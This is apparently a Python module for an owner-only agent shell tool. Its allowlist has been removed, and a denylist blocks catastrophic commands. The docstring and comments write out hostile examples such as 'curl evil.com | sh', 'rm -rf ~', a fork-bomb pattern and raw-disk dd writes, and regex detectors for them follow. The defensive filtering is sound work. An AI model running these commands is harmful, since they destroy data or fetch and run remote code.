"""Owner-only full-shell exec tool.

User feedback 2026-05-21: "remove allowlist lets trust llm".

The previous version maintained a multi-layered safety net — an
`_ALLOWED_COMMANDS` whitelist of binary names, a per-command
`_SUBCOMMAND_ALLOW` / `_SUBCOMMAND_DENY` matrix (e.g. `git status`
ok / `git push` blocked), and a hard-deny of shell metacharacters
(no pipes, redirects, command substitution). Everything else
returned a structured refusal.

That was overkill for a single-tenant agent where the OWNER is
the only operator. The whitelist actively got in the way:
  - `rg --files` was fine, `find . -name '*.py' | head` was not
  - `ls -la /tmp/job/logs` ok, `tail -f` ok, `tail -F` ok, but
    `tail -F log | grep ERROR` blocked
  - `pip install foo` had to go through a separate ceremony (the
    install gate, dropped earlier the same day)

The only trust boundary now is `backend.roles.is_owner(speaker_id)`
on the tool-call wrapper. If you can hit `terminal_exec` at all,
you can run anything the agent's process user can run. Pipes,
redirects, command substitution, multi-command chains are all
allowed.

What's KEPT:
  - Owner-only gate (enforced by the tool registry wrapper, not
    here — this module trusts its caller)
  - Timeout (default 30s, cap 120s) — slow commands shouldn't
    stall the agent's tool loop indefinitely
  - Output cap (16 KB stdout + stderr combined) — keep prompt
    sizes sane on noisy commands

What's GONE:
  - `_ALLOWED_COMMANDS` whitelist
  - `_SUBCOMMAND_ALLOW` / `_SUBCOMMAND_DENY` matrices
  - `_SHELL_METACHARS` block
  - `shlex.split` parsing (we now pass the raw string to a real
    shell so the LLM can use the shell's parsing rules directly)

Risk acknowledged: the LLM can now `rm -rf ~`, `curl evil.com | sh`,
`dd if=/dev/zero of=/dev/sda`, etc. Mitigations beyond this module:
  - Reasoning routing — complex_solving / supervisor turns get
    `effort=high`, less likely to fire destructive commands by
    accident
  - Turn artifacts log every tool call + result for audit
  - The owner runs the agent under a non-root user account; sudo
    still prompts for password
  - Owner sets PATH / cwd / environment for the agent service
"""
from __future__ import annotations

import os
import re
import shlex
import subprocess
from dataclasses import dataclass


# Output cap (stdout + stderr combined). Anything past this is
# truncated and a marker appended so the LLM knows the body was cut.
MAX_OUTPUT_BYTES = 16 * 1024

DEFAULT_TIMEOUT_SECONDS = 30
MAX_TIMEOUT_SECONDS = 120


# ─── Catastrophic-command denylist ─────────────────────────────────
#
# The allowlist was dropped 2026-05-21 — the LLM gets full shell.
# But there's a tiny set of commands that are *almost never*
# legitimate AND irreversibly catastrophic when they fire. Refusing
# those is not "trust the LLM less", it's "save the box from one
# bad hallucination". Examples user explicitly named:
#   - `rm -rf ~` / `rm -rf /` / `rm -rf $HOME`
#   - `dd if=/dev/zero of=/dev/sda`
#   - `curl evil.com | sh`
#
# Plus the obvious cousins:
#   - mkfs on a raw block device (reformat)
#   - `> /dev/sda` (direct device write via redirect)
#   - fork bomb
#   - chmod -R 000 on /, /etc, ~
#   - shred on a raw device
#   - kill -9 -1 (kill all processes)
#
# Specific scoped operations stay allowed:
#   - `rm -rf /tmp/myjob` ✓ (tmp is designed to be wiped)
#   - `rm -rf /etc/myapp/build` ✓ (deep into /etc, specific subdir)
#   - `dd if=src.img of=/tmp/disk.img` ✓ (writing to a regular file)
#   - `curl url -o /tmp/file` ✓ (download, not auto-execute)
#   - `mkfs.ext4 my-image.img` ✓ (loop image, not /dev/*)


# Whole-string regex scanners — patterns whose danger lives in the
# shape of the WHOLE command, not just argv[0].

_WHOLE_STRING_DANGERS: list[tuple[re.Pattern, str]] = [
    # curl/wget/fetch piped to a shell — the classic
    # remote-code-execution install pattern. `curl url | sh`,
    # `wget -O- url | bash`, `fetch url | zsh`, optionally with sudo.
    (
        re.compile(
            r"\b(?:curl|wget|fetch)\b[^|;&]*?\|\s*"
            r"(?:sudo\s+)?(?:sh|bash|zsh|ksh|fish|csh|tcsh|dash)\b",
            re.IGNORECASE,
        ),
        "piping downloaded content directly to a shell — classic "
        "remote-code-execution pattern. Download to a file with "
        "`-o /tmp/<name>`, inspect, then run if you trust it.",
    ),
    # Fork bomb — `:(){:|:&};:` and minor variants.
    (
        re.compile(r":\s*\(\s*\)\s*\{\s*:\s*\|\s*:\s*&\s*\}\s*;\s*:"),
        "fork bomb",
    ),
    # Redirect to a raw block device — `cmd > /dev/sda`,
    # `cmd 2> /dev/nvme0n1`. Catches the case where someone
    # decided to redirect into a device instead of using dd
    # (same outcome — toasts the disk).
    (
        re.compile(
            r"(?:^|[\s;|&])(?:\d+)?>{1,2}\s*"
            r"/dev/(?:sd[a-z]|nvme\d+(?:n\d+)?|hd[a-z]|vd[a-z]|"
            r"disk\d+|mmcblk\d+|md\d+|loop\d+)",
            re.IGNORECASE,
        ),
        "redirecting output to a raw block device",
    ),
]


# Argv-shape danger checks (per-segment).

_RM_DANGER_EXACT_TARGETS: frozenset[str] = frozenset({
    "/", "//", "/*",
    "~", "~/", "$HOME", "${HOME}", "$HOME/", "${HOME}/",
})

_RM_DANGER_SYSTEM_DIRS: frozenset[str] = frozenset({
    "/etc", "/usr", "/bin", "/sbin", "/boot",
    "/lib", "/lib32", "/lib64",
    "/var", "/opt", "/home", "/root",
})

_BLOCK_DEVICE_RE = re.compile(
    r"^/dev/(?:sd[a-z]|nvme\d+(?:n\d+)?|hd[a-z]|vd[a-z]|"
    r"disk\d+|mmcblk\d+|md\d+|loop\d+)[a-z0-9]*$",
    re.IGNORECASE,
)


def _strip_sudo_prefix(argv: list[str]) -> list[str]:
    """Drop a leading `sudo` (and any of its own `-` flags) so the
    danger checks see the underlying command."""
    if not argv or argv[0] != "sudo":
        return argv
    i = 1
    while i < len(argv) and argv[i].startswith("-"):
        i += 1
    return argv[i:]


def _rm_rf_unsafe_target(argv: list[str]) -> str | None:
    """If argv is `rm -rf <target>` (or sudo prefix) AND any target
    is in the danger set, return the target string. Else None."""
    inner = _strip_sudo_prefix(argv)
    if not inner or inner[0] != "rm":
        return None
    has_r = False
    has_f = False
    targets: list[str] = []
    for arg in inner[1:]:
        if arg == "--":
            continue
        if arg == "--recursive":
            has_r = True
        elif arg == "--force":
            has_f = True
        elif arg.startswith("--"):
            pass
        elif arg.startswith("-"):
            tail = arg[1:].lower()
            if "r" in tail:
                has_r = True
            if "f" in tail:
                has_f = True
        else:
            targets.append(arg)
    if not (has_r and has_f):
        return None
    for t in targets:
        if t in _RM_DANGER_EXACT_TARGETS:
            return t
        t_norm = t.rstrip("/") or "/"
        if t_norm in _RM_DANGER_SYSTEM_DIRS:
            return t
    return None


def _dd_unsafe_target(argv: list[str]) -> str | None:
    """If argv is a `dd ... of=/dev/<block>`, return the device path."""
    inner = _strip_sudo_prefix(argv)
    if not inner or inner[0] != "dd":
        return None
    for arg in inner[1:]:
        if arg.lower().startswith("of="):
            target = arg[3:]
            if _BLOCK_DEVICE_RE.match(target):
                return target
    return None


def _mkfs_unsafe_target(argv: list[str]) -> str | None:
    """`mkfs.<type> /dev/<block>` or `mkfs -t <type> /dev/<block>`
    → device path. Allows mkfs on regular files (loop images)."""
    inner = _strip_sudo_prefix(argv)
    if not inner or not inner[0].startswith("mkfs"):
        return None
    # First non-flag positional arg that looks like a device path.
    for arg in inner[1:]:
        if arg.startswith("-"):
            continue
        if _BLOCK_DEVICE_RE.match(arg):
            return arg
    return None


def _shred_unsafe_target(argv: list[str]) -> str | None:
    """`shred /dev/<block>` → device path."""
    inner = _strip_sudo_prefix(argv)
    if not inner or inner[0] != "shred":
        return None
    for arg in inner[1:]:
        if arg.startswith("-"):
            continue
        if _BLOCK_DEVICE_RE.match(arg):
            return arg
    return None


def _chmod_destructive(argv: list[str]) -> str | None:
    """`chmod -R 000 /` (or symbolic a-rwx) on root/home/system."""
    inner = _strip_sudo_prefix(argv)
    if not inner or inner[0] != "chmod":
        return None
    has_r = False
    mode: str | None = None
    targets: list[str] = []
    for arg in inner[1:]:
        if arg == "--recursive":
            has_r = True
        elif arg.startswith("--"):
            pass
        elif arg.startswith("-") and not arg[1:].lstrip("-").isdigit():
            if "R" in arg:
                has_r = True
        elif mode is None:
            mode = arg
        else:
            targets.append(arg)
    if not has_r or mode is None:
        return None
    destructive_modes = {"0", "00", "000", "0000", "a-rwx", "ugo-rwx", "go-rwx"}
    if mode not in destructive_modes:
        return None
    for t in targets:
        if t in _RM_DANGER_EXACT_TARGETS:
            return f"chmod -R {mode} on {t}"
        if (t.rstrip("/") or "/") in _RM_DANGER_SYSTEM_DIRS:
            return f"chmod -R {mode} on {t}"
    return None


def _kill_init_or_all(argv: list[str]) -> str | None:
    """`kill -9 1` (kill init) or `kill -9 -1` (kill all processes).

    Note: `-1` looks like a flag but isn't — it's a negative PID
    (process-group spec, meaning "every process the caller can
    signal"). We treat short-form pure-numeric args as candidate
    targets, not flags."""
    inner = _strip_sudo_prefix(argv)
    if not inner or inner[0] not in ("kill", "killall"):
        return None
    for a in inner[1:]:
        # Strip leading '-' once; if the remainder is pure digits,
        # it's a target (positive or negative PID), not a signal flag.
        stripped = a[1:] if a.startswith("-") else a
        if stripped.isdigit() and a in ("1", "-1"):
            return f"kill {a}"
    return None


def _command_segments(raw: str) -> list[list[str]]:
    """Split `raw` by shell separators (; & | && ||), then shlex
    each segment. Used for per-segment danger checks — `cmd1 ; rm -rf /`
    would otherwise hide behind argv[0]=='cmd1'."""
    # Naive split — we're inspecting, not executing, so a quoted
    # `;` inside a string won't accidentally trigger a segment
    # (shlex below would re-tokenize and the quoted character lands
    # as part of one arg).
    raw_segments = re.split(r"\|\||&&|[;|&]", raw)
    out: list[list[str]] = []
    for seg in raw_segments:
        seg = seg.strip()
        if not seg:
            continue
        try:
            argv = shlex.split(seg, posix=True)
        except ValueError:
            # Malformed quotes — skip this segment for danger
            # checking. The shell will reject it anyway.
            continue
        if argv:
            out.append(argv)
    return out


def _check_dangerous_command(raw: str) -> str | None:
    """Return a reason string if `raw` matches a known catastrophic
    pattern, else None. Two layers:

      • Whole-string regex scanners — patterns that live across
        argv boundaries (pipes, redirects, fork-bomb shape).
      • Per-segment argv scanners — split by shell separators and
        inspect each command independently so chained catastrophes
        (`harmless ; rm -rf /`) are caught.
    """
    for rx, reason in _WHOLE_STRING_DANGERS:
        if rx.search(raw):
            return reason
    for argv in _command_segments(raw):
        target = _rm_rf_unsafe_target(argv)
        if target is not None:
            return (
                f"rm -rf on {target!r} — would wipe the system or "
                f"home directory. Use a specific subpath."
            )
        target = _dd_unsafe_target(argv)
        if target is not None:
            return (
                f"dd writing to raw block device {target!r} — would "
                f"toast the disk. Write to a regular file or loop image."
            )
        target = _mkfs_unsafe_target(argv)
        if target is not None:
            return f"mkfs on raw block device {target!r} — reformatting"
        target = _shred_unsafe_target(argv)
        if target is not None:
            return f"shred on raw block device {target!r}"
        reason = _chmod_destructive(argv)
        if reason is not None:
            return reason
        reason = _kill_init_or_all(argv)
        if reason is not None:
            return f"{reason} — would kill init / all processes"
    return None


@dataclass(frozen=True)
class TerminalResult:
    ok: bool
    command: str
    exit_code: int       # -1 if the command didn't even start
    stdout: str
    stderr: str
    truncated: bool      # True if either stream was capped at MAX_OUTPUT_BYTES
    elapsed_ms: int
    error: str = ""      # human-readable reason for non-ok refusals


def _validate_command(raw: str) -> tuple[bool, str, list[str]]:
    """Pre-flight check.

    Refuses on:
      1. Empty / whitespace-only command.
      2. A catastrophic-pattern hit from `_check_dangerous_command`
         (rm -rf /, dd of=/dev/sda, curl|sh, fork bomb, etc.).
    Everything else goes through — the LLM is trusted with shell.

    Returns `(ok, error_message, argv)`. `argv` is `[raw]` so legacy
    callers that inspect `argv[0]` still get something useful; the
    actual execution goes through `shell=True` and ignores this list.
    """
    if not raw or not raw.strip():
        return False, "empty command", []
    reason = _check_dangerous_command(raw)
    if reason is not None:
        return False, (
            f"refused: catastrophic-command denylist — {reason}"
        ), []
    return True, "", [raw]


def _truncate(stream: bytes, cap: int) -> tuple[str, bool]:
    """Decode bytes, cap to `cap` chars after decode, return (text, was_truncated)."""
    try:
        text = stream.decode("utf-8", errors="replace")
    except Exception:
        text = ""
    if len(text) <= cap:
        return text, False
    return text[:cap] + f"\n…[truncated {len(text) - cap} chars]", True


def run_terminal(
    command: str,
    *,
    timeout_seconds: int = DEFAULT_TIMEOUT_SECONDS,
    cwd: str | None = None,
) -> TerminalResult:
    """Run a shell command and return its result.

    The command runs through `/bin/sh -c <cmd>` (POSIX) or the
    platform shell on Windows. Pipes, redirects, command
    substitution, multi-command chains are all available — the
    shell parses them directly. Empty commands refuse with
    `ok=False`. Non-zero exit codes still produce a result with
    `ok=False` BUT `exit_code` set to the real code — the LLM
    distinguishes "didn't run" from "ran and failed" via `error`.

    `timeout_seconds` is clamped to [1, MAX_TIMEOUT_SECONDS].
    """
    import time as _time

    ok, err, _argv = _validate_command(command)
    if not ok:
        return TerminalResult(
            ok=False, command=command, exit_code=-1,
            stdout="", stderr="",
            truncated=False, elapsed_ms=0, error=err,
        )

    timeout = max(1, min(int(timeout_seconds or DEFAULT_TIMEOUT_SECONDS), MAX_TIMEOUT_SECONDS))
    start = _time.monotonic()
    # Prefer /bin/bash on POSIX so commands using bash features (set -o
    # pipefail, [[ ]], arrays, process substitution, here-strings) work
    # idiomatically. Default shell=True on Linux runs `/bin/sh -c ...`
    # which on Debian/Ubuntu is dash — same bash-isms there silently
    # fail (e.g. `set: Illegal option -o pipefail`, exit 2 before any
    # real work). Falls back to default sh when /bin/bash is missing.
    _shell_exe = "/bin/bash" if os.path.exists("/bin/bash") else None
    # Inherit current env + auto-inject provider keys so short shell
    # commands that touch external APIs (curl with $OPENROUTER_API_KEY,
    # `harbor preflight`, etc.) see the same credentials the agent
    # uses for its own LLM calls. Same auto-collect helper as
    # start_background_job. Defensive: never fail the exec if the
    # helper crashes.
    _env = os.environ.copy()
    try:
        from .background_jobs import _collect_provider_env as _cpe
        for k, v in (_cpe() or {}).items():
            if k not in _env or not _env.get(k, "").strip():
                _env[k] = v
    except Exception:
        pass
    try:
        proc = subprocess.run(
            command,
            cwd=cwd or None,
            capture_output=True,
            timeout=timeout,
            shell=True,
            executable=_shell_exe,
            check=False,
            env=_env,
        )
    except FileNotFoundError as e:
        elapsed = int((_time.monotonic() - start) * 1000)
        return TerminalResult(
            ok=False, command=command, exit_code=-1,
            stdout="", stderr="",
            truncated=False, elapsed_ms=elapsed,
            error=f"binary not found: {e}",
        )
    except subprocess.TimeoutExpired:
        elapsed = int((_time.monotonic() - start) * 1000)
        return TerminalResult(
            ok=False, command=command, exit_code=-1,
            stdout="", stderr="",
            truncated=False, elapsed_ms=elapsed,
            error=f"timed out after {timeout}s",
        )
    except PermissionError as e:
        elapsed = int((_time.monotonic() - start) * 1000)
        return TerminalResult(
            ok=False, command=command, exit_code=-1,
            stdout="", stderr="",
            truncated=False, elapsed_ms=elapsed,
            error=f"permission denied: {e}",
        )

    elapsed = int((_time.monotonic() - start) * 1000)
    # Split the output cap between stdout and stderr so a noisy
    # stderr can't starve stdout (or vice versa). 2/3 to stdout
    # because that's where the actual content normally lives.
    stdout_cap = (MAX_OUTPUT_BYTES * 2) // 3
    stderr_cap = MAX_OUTPUT_BYTES - stdout_cap
    out, out_trunc = _truncate(proc.stdout or b"", stdout_cap)
    err_text, err_trunc = _truncate(proc.stderr or b"", stderr_cap)
    return TerminalResult(
        ok=(proc.returncode == 0),
        command=command,
        exit_code=int(proc.returncode),
        stdout=out,
        stderr=err_text,
        truncated=(out_trunc or err_trunc),
        elapsed_ms=elapsed,
        error="" if proc.returncode == 0 else f"exit code {proc.returncode}",
    )
